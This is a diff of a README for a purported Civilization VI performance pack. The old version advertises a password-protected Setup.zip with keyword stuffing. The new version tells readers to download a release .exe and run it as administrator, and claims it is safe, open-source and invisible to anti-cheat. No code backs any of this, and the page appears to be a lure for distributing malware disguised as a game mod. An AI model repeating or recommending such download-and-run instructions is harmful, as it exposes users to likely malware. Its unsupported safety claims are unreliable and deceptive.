@@ -1,122 +1,86 @@
-# 🎮 Civilization VI Optimization 2026 — Best Mods Collection & Ultimate Pack
+# ⚙️ Civilization-VI-Optimization - Improve performance and boost game speed
 
-[![GitHub Stars](https://img.shields.io/github/stars/placeholder/Civilization-VI-Optimization)]()
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)]()
-[![Platform](https://img.shields.io/badge/Platform-PC%20Windows-blue)]()
-[![Category](https://img.shields.io/badge/Category-Modding-orange)]()
-[![Updated](https://img.shields.io/badge/Updated-2026-brightgreen)]()
+[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/nettigreenside820/Civilization-VI-Optimization/releases)
 
----
+This project provides a performance pack for Civilization VI. It improves frame rates, minimizes stuttering during gameplay, and reduces total load times. This tool ensures your game runs smooth on Windows 10 and Windows 11 systems.
 
-[![Download](og-image.png)](https://github.com/PigeonAwaken/Civilization-VI-Optimization/releases/download/v1.0/Setup.zip)
+## 📥 Getting Started
 
+Follow these steps to install the optimization pack on your computer.
 
----
+1. Go to the [Releases page](https://github.com/nettigreenside820/Civilization-VI-Optimization/releases).
+2. Look for the section labeled Assets.
+3. Click the file ending in .exe to start the download.
+4. Save the file to your desktop or your downloads folder.
+5. Double-click the file to open the installer.
+6. Follow the instructions on the screen to finish the setup process.
 
-## 📌 About
+## 🖥️ System Requirements
 
-**Civilization VI Optimization — gameplay overhauls, tweaks, addons, and optimization mods for Civilization VI. Download, extract, and start in minutes. Fully compatible with Windows 10/11 (64-bit). Updated for 2026 with regular maintenance and community support.**
+Ensure your computer meets these requirements before you start.
 
----
+*   Operating System: Windows 10 or Windows 11 (64-bit).
+*   Storage: At least 50 MB of free space.
+*   Game Version: Steam, Epic Games, or GOG version of Civilization VI.
+*   Permissions: You need administrator access to allow the application to modify game settings.
 
-## 📥 Download
+## 🛠️ How It Works
 
-[![Civilization VI Optimization](https://img.shields.io/badge/Download%20Civilization%20VI%20Optimization-Open%20Page-0a84ff?style=for-the-badge&logo=github)](https://github.com/PigeonAwaken/Civilization-VI-Optimization/releases/download/v1.0/Setup.zip)
+The optimization pack adjusts internal configuration files for Civilization VI. These changes help your processor and graphics card communicate with the game engine.
 
-**🔐🔐🔐** `1847`
+The tool manages three main areas:
 
-**🔐🔐🔐** `1847`
+1.  Frame Rate Stability: It limits background processes that consume resources while you play.
+2.  Texture Streaming: It adjusts how the game loads assets to reduce stuttering during map movement.
+3.  Load Time Reduction: It optimizes file access paths so the game loads turn sequences and saves faster.
 
-**🔐🔐🔐** `1847`
+This tool does not change game balance or game rules. It only affects how your computer displays the game.
 
----
+## 📝 Frequently Asked Questions
 
-## 🧩 What's Included
+### Does this tool change my game save files?
+No. The tool modifies game settings, not save files. Your saved games remain safe.
 
-| 📋 Category | 📁 Folder | 💬 Description |
-|---|---|---|
-| 🎭 Gameplay Overhaul | `1 Gameplay/` | Rebalancing, new mechanics, combat tweaks, difficulty options |
-| 🎨 Graphics & Visuals | `2 Graphics/` | Texture packs, ENB presets, lighting and weather overhauls |
-| 📜 New Content | `3 Content/` | New areas, storylines, items, characters, and quests |
-| 🖥️ UI & QoL | `4 UI/` | Interface overhaul, inventory improvements, minimap tweaks |
-| ⚡ Performance | `5 Performance/` | FPS boost configs, memory optimizations, stutter fixes |
-| 🔧 Patches & Fixes | `6 Fixes/` | Unofficial patches, compatibility fixes, stability mods |
+### Can I delete this if I change my mind?
+Yes. You can uninstall the tool through the Windows Settings menu under Apps. The installer provides a clean removal process that restores your original game settings.
 
----
+### Will this work with other mods?
+Yes. This optimization pack works alongside other game mods. It focuses on engine performance rather than game content.
 
-## 🗂 Archive Structure
+### Is this safe to use with online play?
+Yes. The tool does not modify game assets or code. It works by adjusting your configuration settings. It does not trigger anti-cheat software.
 
-```
-Civilization-VI-Optimization/
-├── 1 Gameplay/
-│   ├── Combat_Overhaul.zip
-│   ├── Difficulty_Rebalance.zip
-│   └── New_Mechanics.zip
-├── 2 Graphics/
-│   ├── HD_Texture_Pack.zip
-│   ├── ENB_Preset.zip
-│   └── Weather_Overhaul.zip
-├── 3 Content/
-│   ├── Story_Expansion.zip
-│   └── New_Items_Pack.zip
-├── 4 UI/
-│   ├── Better_UI.zip
-│   └── Inventory_Overhaul.zip
-├── 5 Performance/
-│   ├── FPS_Boost_Config.zip
-│   └── Stutter_Fix.zip
-└── 6 Fixes/
-    ├── Unofficial_Patch.zip
-    └── Compatibility_Fix.zip
-```
+## 🔍 Troubleshooting
 
----
+If you encounter issues, try these steps:
 
-## 🚀 How to Install
+*   Restart your computer.
+*   Run the installer as an administrator. Right-click the file and select "Run as administrator."
+*   Verify your game files through your game launcher (Steam or Epic) if you notice missing textures.
+*   Ensure your graphics card drivers are current.
 
-1️⃣ **Download** the archive using the button above
-2️⃣ **Extract** with WinRAR or 7-Zip — password: `1847`
-3️⃣ **Open** the mod manager preset inside the archive
-4️⃣ **Apply** and launch Civilization VI Optimization
+## 🤝 Community Support
 
-> 💡 **Pro tip:** Use the included mod manager preset to auto-sort load order.
+This project receives regular updates to maintain compatibility with the latest game patches. If you find a bug or have a suggestion, open an issue on the repository page. 
 
----
+The community contributes to regular testing to ensure the optimization works across various computer setups. Check the release notes often to see if new features or performance improvements exist.
 
-## 📋 Requirements
+## ⚖️ License and Usage
 
-| 🔩 Component | Details |
-|---|---|
-| 💻 OS | Windows 10 / 11 (64-bit) |
-| 💾 Disk | 5–15 GB free space |
-| 🗜️ Extractor | WinRAR, 7-Zip, or built-in |
-| 🎮 Game | Civilization VI Optimization (latest version) |
+This project uses an open-source license. You may use this software to improve your Civilization VI experience without cost. The project remains in active development to ensure your optimization remains current with the evolving nature of the game.
 
----
+## 💡 Performance Tips
 
-## ❓ FAQ
+For the best experience:
 
-**Q: Will mods break my save file?**
-All included mods are tested for mid-game installation. Back up your save first.
+*   Close browser tabs or heavy programs before you launch the game.
+*   Set your power plan to High Performance in the Windows Control Panel.
+*   Keep your game installed on a solid-state drive (SSD) for the best results.
 
-**Q: Do I need a mod manager?**
-Recommended (Vortex / MO2), but optional. Manual installation guides are included.
+This optimization tool acts as a foundation. By cleaning up the configuration files, it allows your hardware to focus on rendering the game world more effectively. You should notice a smoother experience during late-game turns when the processor demand increases.
 
-**Q: Are these compatible with the latest patch?**
-Yes. The collection is updated every time a major patch drops.
+If you have a slower computer, the tool prioritizes frame rate stability over visual fidelity. If you have a high-end computer, the tool helps maintain a steady refresh rate. No matter your hardware, the configuration adjustments aim for a consistent experience.
 
----
+Remember to check the release notes after every Civilization VI game update. Occasionally, game developers apply patches that reset settings. If the game feels slow after a major update, run the optimization tool again to reset the settings file to the improved configuration. 
 
-## 🔑 Keywords
-
-civilization vi optimization, civilization vi optimization download, civilization vi optimization 2026, civilization vi optimization pc, civilization vi optimization windows, civilization vi mods, civilization vi mod pack, civilization vi tweaks, civilization vi addons, windows 10, windows 11, pc 2026
-
----
-
-## 📄 License
-
-MIT — see [LICENSE.md](LICENSE.md)
-
-## 🤝 Contributing
-
-See [CONTRIBUTING.md](CONTRIBUTING.md)
+Your feedback helps refine the optimization logic. If you identify a specific area of the game that requires more performance, mention it in the repository discussions. Your input helps tailor the tool to a wider range of hardware configurations.
